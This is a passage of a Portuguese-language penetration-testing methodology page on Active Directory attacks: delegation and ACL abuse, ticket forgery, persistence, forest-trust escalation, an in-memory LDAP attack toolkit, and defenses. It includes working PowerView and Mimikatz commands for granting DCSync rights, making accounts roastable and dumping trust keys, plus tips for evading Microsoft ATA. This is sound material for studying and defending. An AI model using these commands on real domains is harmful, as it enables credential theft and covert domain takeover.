Graças à constrained delegation, você poderia até **comprometer automaticamente um Print Server** (esperamos que seja um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador estiver autorizado para "Constrained Delegation", ele poderá **personificar qualquer usuário para acessar determinados serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, poderá **personificar qualquer usuário** (até mesmo domain admins) para acessar determinados serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter o privilégio **WRITE** sobre um objeto do Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissions/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre determinados objetos do domínio** que podem permitir **movimentação** lateral/**escalada** de privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **serviço Spool escutando** dentro do domínio pode ser **abusado** para **obter novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, será possível **coletar credenciais da memória** e até mesmo **injetar beacons nos processos deles** para personificá-los.\
Normalmente, os usuários acessam o sistema via RDP. Portanto, veja aqui como realizar alguns ataques em sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O **LAPS** fornece um sistema para gerenciar a **senha do Administrator local** em computadores ingressados no domínio, garantindo que ela seja **randomizada**, única e **alterada** com frequência. Essas senhas são armazenadas no Active Directory, e o acesso é controlado por ACLs somente para usuários autorizados. Com permissões suficientes para acessar essas senhas, torna-se possível fazer pivoting para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Roubo de certificados

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Se **templates vulneráveis** estiverem configurados, será possível abusar deles para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation com conta de alto privilégio

### Dumping de credenciais do domínio

Depois de obter privilégios de **Domain Admin** ou, melhor ainda, de **Enterprise Admin**, você poderá fazer **dump** do **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como Persistence

Algumas das técnicas discutidas anteriormente podem ser usadas para persistence.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **Silver Ticket attack** cria um **ticket legítimo de Ticket Granting Service (TGS)** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Esse método é usado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **Golden Ticket attack** envolve um invasor obtendo acesso ao **hash NTLM da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, que são essenciais para autenticação na rede AD.

Depois que o invasor obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Eles são semelhantes a golden tickets forjados de uma maneira que **contorna mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence de contas com certificados**

**Ter certificados de uma conta ou poder solicitá-los** é uma ótima forma de conseguir manter persistence na conta do usuário (mesmo que ele altere a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence de domínio com certificados**

**Também é possível usar certificados para manter persistence com privilégios elevados dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão a esses grupos para impedir alterações não autorizadas. No entanto, esse recurso pode ser explorado; se um invasor modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário obterá amplo controle sobre todos os grupos privilegiados. Essa medida de segurança, criada para proteção, pode acabar permitindo acesso indevido se não for monitorada de perto.

[**Mais informações sobre o grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de administrador em uma máquina desse tipo, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo acesso remoto à conta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence com ACL

Você pode **conceder** algumas **permissões especiais** a um **usuário** sobre determinados objetos específicos do domínio, permitindo que o usuário **escale privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** possui **sobre** outro **objeto**. Se você conseguir apenas fazer uma **pequena alteração** no **security descriptor** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse a classe auxiliar `dynamicObject` para criar principals/GPOs/registros DNS de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se excluem automaticamente sem tombstones, apagando evidências LDAP enquanto deixam SIDs órfãos, referências `gPLink` quebradas ou respostas DNS armazenadas em cache (por exemplo, poluição de ACEs do AdminSDHolder ou redirects maliciosos de `gPCFileSysPath`/DNS integrado ao AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **enviar atributos** (SIDHistory, SPNs...) para objetos especificados **sem deixar nenhum **log** sobre as **modificações**. Você **precisa de privilégios DA** e deve estar dentro do **root domain**.\
Observe que, se você usar dados incorretos, logs bastante desagradáveis aparecerão.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence com LAPS

Anteriormente, discutimos como escalar privilégios caso você tenha **permissão suficiente para ler as senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter persistence**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilégios na Forest - Domain Trusts

A Microsoft considera a **Forest** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Forest**.<sup>[[1]](#references)</sup>

### Informações básicas

Um [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Ele cria essencialmente uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam de forma transparente. Quando os domínios configuram um trust, eles trocam e armazenam **chaves** específicas em seus **Domain Controllers (DCs)**, que são essenciais para a integridade do trust.

Em um cenário típico, se um usuário quiser acessar um serviço em um **domínio confiável**, primeiro deverá solicitar um ticket especial conhecido como **inter-realm TGT** ao DC de seu próprio domínio. Esse TGT é criptografado com uma **chave** compartilhada que foi acordada por ambos os domínios. Em seguida, o usuário apresenta esse TGT ao **DC do domínio confiável** para obter um service ticket (**TGS**). Após validar com sucesso o inter-realm TGT, o DC do domínio confiável emite um TGS, concedendo ao usuário acesso ao serviço.

**Etapas**:

1. Um **computador cliente** no **Domínio 1** inicia o processo usando seu **hash NTLM** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. O DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente solicita então um **inter-realm TGT** ao DC1, necessário para acessar recursos no **Domínio 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre o DC1 e o DC2 como parte do domain trust bidirecional.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2) do Domínio 2**.
6. O DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se ele for válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domínio 2 que o cliente deseja acessar.
7. Por fim, o cliente apresenta esse TGS ao servidor, que é criptografado com o hash da conta do servidor, para obter acesso ao serviço no Domínio 2.

### Diferentes trusts

É importante observar que **um trust pode ser de 1 via ou de 2 vias**. Nas opções de 2 vias, ambos os domínios confiarão um no outro, mas na relação de trust de **1 via**, um dos domínios será o **trusted** e o outro, o domínio **trusting**. Nesse último caso, **você só poderá acessar recursos dentro do domínio trusting a partir do domínio trusted**.

Se o Domínio A confia no Domínio B, A é o domínio trusting e B é o trusted. Além disso, no **Domínio A**, isso seria um **Outbound trust**; e no **Domínio B**, seria um **Inbound trust**.

**Diferentes relações de trust**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma forest, na qual um child domain possui automaticamente um trust transitivo bidirecional com seu parent domain. Essencialmente, isso significa que as solicitações de autenticação podem fluir de forma transparente entre o parent e o child.
- **Cross-link Trusts**: Conhecidos como "shortcut trusts", são estabelecidos entre child domains para acelerar processos de referral. Em forests complexas, os referrals de autenticação normalmente precisam subir até a forest root e depois descer até o domínio de destino. Ao criar cross-links, o caminho é encurtado, o que é especialmente benéfico em ambientes geograficamente distribuídos.
- **External Trusts**: São configurados entre domínios diferentes e não relacionados, sendo não transitivos por natureza. De acordo com a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da forest atual que não esteja conectado por um forest trust. A segurança é reforçada por meio de SID filtering com external trusts.
- **Tree-root Trusts**: Esses trusts são estabelecidos automaticamente entre o domínio forest root e uma nova tree root adicionada. Embora não sejam encontrados com frequência, tree-root trusts são importantes para adicionar novas árvores de domínio a uma forest, permitindo que elas mantenham um nome de domínio exclusivo e garantindo transitividade bidirecional. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Esse tipo de trust é um trust transitivo bidirecional entre dois domínios forest root, também aplicando SID filtering para reforçar as medidas de segurança.
- **MIT Trusts**: Esses trusts são estabelecidos com domínios Kerberos não Windows compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializados e atendem a ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças nas **relações de trust**

- Uma relação de trust também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não transitiva**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Attack Path

1. **Enumerar** as relações de trust
2. Verificar se algum **security principal** (usuário/grupo/computador) tem **acesso** aos recursos do **outro domínio**, talvez por entradas ACE ou por pertencer a grupos do outro domínio. Procure por **relações entre domínios** (provavelmente o trust foi criado para isso).
1. Kerberoast neste caso pode ser outra opção.
3. **Comprometer** as **contas** que podem fazer **pivoting** entre domínios.

Atacantes com acesso a recursos em outro domínio podem utilizar três mecanismos principais:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. No entanto, a eficácia desse método depende da natureza do trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, especialmente como entidades em **ACEs** dentro de uma **DACL**, fornecendo acesso a recursos específicos. Para quem quiser se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper intitulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso valioso.<sup>[[17]](#references)</sup>

### Encontrar usuários/grupos externos com permissões

Você pode verificar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar security principals estrangeiros no domínio. Eles serão usuários/grupos de **um domínio/forest externo**.

Você pode verificar isso no **Bloodhound** ou usando o powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilégios de filho para pai na floresta
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar relações de confiança de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 chaves confiáveis**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode obter as usadas pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale para Enterprise admin no domínio child/parent explorando a trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como a Configuration Naming Context (NC) pode ser explorada é crucial. A Configuration NC funciona como um repositório central para dados de configuração em uma forest nos ambientes do Active Directory (AD). Esses dados são replicados para todos os Domain Controllers (DC) dentro da forest, com os DCs graváveis mantendo uma cópia gravável da Configuration NC. Para explorar isso, é necessário ter privilégios de **SYSTEM em um DC**, preferencialmente um child DC.

**Vincular GPO ao site do DC raiz**

O contêiner Sites da Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da forest do AD. Operando com privilégios de SYSTEM em qualquer DC, os atacantes podem vincular GPOs aos sites dos DCs raiz. Essa ação pode comprometer o domínio raiz ao manipular as políticas aplicadas a esses sites.

Para obter informações detalhadas, pode-se consultar pesquisas sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer qualquer gMSA na forest**

Um vetor de ataque envolve visar gMSAs privilegiadas dentro do domínio. A chave raiz KDS, essencial para calcular as senhas das gMSAs, é armazenada na Configuration NC. Com privilégios de SYSTEM em qualquer DC, é possível acessar a chave raiz KDS e calcular as senhas de qualquer gMSA em toda a forest.

Uma análise detalhada e orientações passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusando dos atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Este método exige paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios de SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle completo sobre todas as classes. Isso pode levar a acesso e controle não autorizados sobre objetos AD recém-criados.

Mais informações estão disponíveis em [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 tem como alvo o controle sobre objetos da Public Key Infrastructure (PKI) para criar um certificate template que permita a autenticação como qualquer usuário dentro da forest. Como os objetos PKI residem na Configuration NC, comprometer um child DC gravável permite executar ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domínio de uma Forest externa - One-Way (Inbound) ou bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, **seu domínio é confiável** por um domínio externo, que lhe concede **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm qual nível de acesso ao domínio externo** e então tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de floresta externo - Unidirecional (de saída)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiável **cria um usuário** com um **nome previsível** que usa como **senha a senha do domínio confiável**. Isso significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiável**, enumerá-lo e tentar escalar ainda mais os privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiável é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** à do trust entre os domínios, o que não é muito comum.

Outra forma de comprometer o domínio confiável é aguardar em uma máquina onde um **usuário do domínio confiável possa acessar** para fazer login via **RDP**. Em seguida, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima tiver montado o disco rígido**, o atacante poderia, a partir do processo da sessão **RDP**, armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada de **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de trust entre domínios

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history entre trusts de forests é mitigado pelo SID Filtering, que é ativado por padrão em todos os trusts entre forests. Isso se baseia na suposição de que os trusts dentro de uma forest são seguros, considerando a forest, e não o domínio, como o limite de segurança, de acordo com a posição da Microsoft.
- No entanto, há um problema: o SID filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts entre forests, o uso de Selective Authentication garante que os usuários das duas forests não sejam autenticados automaticamente. Em vez disso, são necessárias permissões explícitas para que os usuários acessem domínios e servidores dentro do domínio ou da forest que confia.
- É importante observar que essas medidas não protegem contra a exploração do Writable Configuration Naming Context (NC) nem contra ataques à conta do trust.

[**Mais informações sobre trusts entre domínios em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD baseado em LDAP a partir de implants no host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como Beacon Object Files x64 que são executados inteiramente dentro de um implant no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e então executam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança do logon atual via LDAP (389), com signing/sealing, ou LDAPS (636), com confiança automática no certificado; portanto, não são necessários proxies socks nem artefatos em disco.<sup>[[4]](#references)</sup>

### Enumeração LDAP no implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e extraem os objetos correspondentes.
- `get-object`, `get-attribute` e `get-domaininfo` obtêm atributos arbitrários (incluindo descritores de segurança), além dos metadados da forest/domínio a partir do `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` expõem diretamente a partir do LDAP candidatos a roasting, configurações de delegation e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/gravações de atributos) e herança, fornecendo alvos imediatos para privilege escalation via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escrita LDAP para escalada e persistência

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem ao operador preparar novos principals ou contas de máquina onde quer que existam direitos sobre a OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` sequestram diretamente os alvos assim que são encontrados direitos de escrita de propriedades.
- Comandos focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, transformam WriteDACL/WriteOwner em qualquer objeto AD em redefinições de senha, controle de associação a grupos ou privilégios de replicação DCSync, sem deixar artefatos de PowerShell/ADSI. Os correspondentes `remove-*` limpam as ACEs injetadas.

### Delegation, roasting e abuso de Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido vulnerável a Kerberoast; `add-asreproastable` (toggle de UAC) marca-o para AS-REP roasting sem tocar na senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no histórico de SID de um principal controlado (consulte [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente por LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante arraste ativos para OUs onde já existem direitos delegados antes de abusar de `set-password`, `add-groupmember` ou `add-spn`.
- Comandos de remoção cuidadosamente delimitados (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem uma reversão rápida depois que o operador coleta credenciais ou persistência, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas defesas gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Restrições para Domain Admins**: recomenda-se que Domain Admins tenham permissão para fazer login apenas em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de contas de serviço**: os serviços não devem ser executados com privilégios de Domain Admin (DA), a fim de manter a segurança.
- **Limitação temporal de privilégios**: para tarefas que exigem privilégios de DA, sua duração deve ser limitada. Isso pode ser alcançado com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de LDAP relay**: audite os Event IDs 2889/3074/3075 e, em seguida, imponha LDAP signing e o channel binding de LDAPS em DCs/clientes para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting em nível de protocolo da atividade do Impacket

Se você quiser detectar tradecraft comum de AD, **não dependa apenas de artefatos controlados pelo operador**, como binários renomeados, nomes de serviços, arquivos batch temporários ou caminhos de saída. Estabeleça uma baseline de como clientes Windows legítimos constroem tráfego de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI; em seguida, procure **peculiaridades de implementação** que permaneçam mesmo depois que o operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidatos independentes de alta confiança** (após validação com sua própria baseline):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Padding de autenticação DCE/RPC preenchido com `0xff`
- Binds Kerberos LDAP que colocam um `AP-REQ` Kerberos bruto diretamente em `mechToken` do SPNEGO
- Solicitações de negociação SMB2/3 com valores de `ClientGuid` semelhantes a ASCII
- `IWbemLevel1Login::NTLMLogin` do WMI usando o namespace não padrão `//./root/cimv2`
- Valores de nonce Kerberos hardcoded
- **Melhores como recursos de correlação/pontuação**:
- Listas de etype Kerberos esparsas ou duplicadas, `PA-DATA` incomum/ausente ou ordenação de etypes em TGS-REQ diferente da nativa do Windows
- Mensagens NTLM Type 1 sem informações de versão ou mensagens Type 3 com nomes de host nulos
- NTLMSSP bruto transportado em DCE/RPC em vez de SPNEGO, trailers de verificação DCE/RPC ausentes ou incompatibilidades de OID entre SPNEGO/Kerberos
- Várias dessas características provenientes do mesmo host/usuário/sessão/janela de tempo são muito mais fortes do que qualquer campo fraco isolado
- **Use como enriquecimento, não como alertas independentes**:
- Nomes de arquivo padrão, caminhos de saída, nomes de serviços aleatórios, nomes de batch temporários, nomes padrão de contas de computador e strings específicas de ferramentas para HTTP/WebDAV/RDP/MSSQL
- São fáceis de alterar pelos operadores e devem ser usados principalmente para explicar por que um cluster entre protocolos é suspeito
- **Notas operacionais**:
- Alguns desses sinais exigem tráfego descriptografado, [análise de PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou visibilidade no lado do serviço
- Valide-os com clientes Samba/Linux, appliances e softwares legados antes de promovê-los a alertas
- Promova as detecções de enriquecimento -> hunting -> alertas à medida que ganhar confiança na baseline

### **Implementando técnicas de deception**

- Implementar deception envolve criar armadilhas, como usuários ou computadores chamariz, com características como senhas que não expiram ou marcadas como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de altos privilégios.<sup>[[2]](#references)</sup>
- Um exemplo prático envolve o uso de ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais informações sobre a implementação de técnicas de deception podem ser encontradas em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando deception**

- **Para objetos de usuário**: indicadores suspeitos incluem ObjectSID atípico, logons infrequentes, datas de criação e baixa contagem de senhas incorretas.
- **Indicadores gerais**: comparar os atributos de possíveis objetos chamariz com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar esse tipo de deception.

### **Contornando sistemas de detecção**

- **Bypass da detecção do Microsoft ATA**:
- **Enumeração de usuários**: evitar a enumeração de sessões em Domain Controllers para impedir a detecção pelo ATA.
- **Impersonation de tickets**: utilizar chaves **aes** para a criação de tickets ajuda a evitar a detecção ao não fazer downgrade para NTLM.
- **Ataques DCSync**: recomenda-se executá-los a partir de um dispositivo que não seja um Domain Controller para evitar a detecção pelo ATA, pois a execução direta a partir de um Domain Controller acionará alertas.

## Referências

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
